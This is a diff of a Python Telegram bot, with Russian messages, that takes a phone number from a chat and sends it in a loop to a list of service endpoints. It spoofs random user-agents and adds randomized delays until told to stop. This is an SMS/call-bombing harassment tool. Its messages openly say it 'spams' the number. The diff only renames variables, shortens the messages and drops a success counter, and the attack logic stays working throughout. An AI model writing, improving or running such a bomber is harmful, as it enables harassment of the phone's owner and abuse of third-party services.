@@ -25,50 +25,46 @@ endpoints = [
 active = {}
 
 @bot.message_handler(commands=['start'])
-def start(message):
-    bot.reply_to(message, "Отправьте номер телефона, и я начну спамить. Для остановки используйте /stop")
+def start(m):
+    bot.reply_to(m, "отправь номер")
 
 @bot.message_handler(commands=['stop'])
-def stop(message):
-    if message.chat.id in active:
-        active[message.chat.id]['stop'] = True
-        bot.reply_to(message, "Останавливаю спам...")
+def stop(m):
+    if m.chat.id in active:
+        active[m.chat.id]['stop'] = True
+        bot.reply_to(m, "остановлено")
     else:
-        bot.reply_to(message, "Активный спам не найден")
+        bot.reply_to(m, "нет спама")
 
 @bot.message_handler(func=lambda m: True)
-def handle_number(message):
-    phone = ''.join(filter(str.isdigit, message.text.strip()))
+def handle(m):
+    phone = ''.join(filter(str.isdigit, m.text.strip()))
     if len(phone) < 10:
-        bot.reply_to(message, "Это не похоже на номер телефона")
+        bot.reply_to(m, "не номер")
         return
-    if message.chat.id in active:
-        bot.reply_to(message, "Уже запущен спам для этого чата")
+    if m.chat.id in active:
+        bot.reply_to(m, "уже спамим")
         return
-    bot.reply_to(message, f"Начинаю спам на номер {phone}. Для остановки введите /stop")
+    bot.reply_to(m, "спамлю")
     def worker(chat_id, phone):
         ua = UserAgent()
-        total = 0
         active[chat_id] = {'stop': False}
         try:
             while not active[chat_id]['stop']:
-                for endpoint in endpoints:
+                for ep in endpoints:
                     if active[chat_id]['stop']:
                         break
                     try:
                         headers = {'user-agent': ua.random}
                         data = {'phone': phone}
-                        r = requests.post(endpoint, headers=headers, data=data, timeout=10)
-                        if r.status_code == 200:
-                            total += 1
+                        requests.post(ep, headers=headers, data=data, timeout=10)
                     except:
                         pass
                     time.sleep(random.uniform(1.5, 2.5))
         finally:
             if chat_id in active:
                 del active[chat_id]
-        bot.send_message(chat_id, f"Спам остановлен. Всего успешных запросов: {total}")
-    threading.Thread(target=worker, args=(message.chat.id, phone), daemon=True).start()
+    threading.Thread(target=worker, args=(m.chat.id, phone), daemon=True).start()
 
 if __name__ == '__main__':
     bot.infinity_polling()
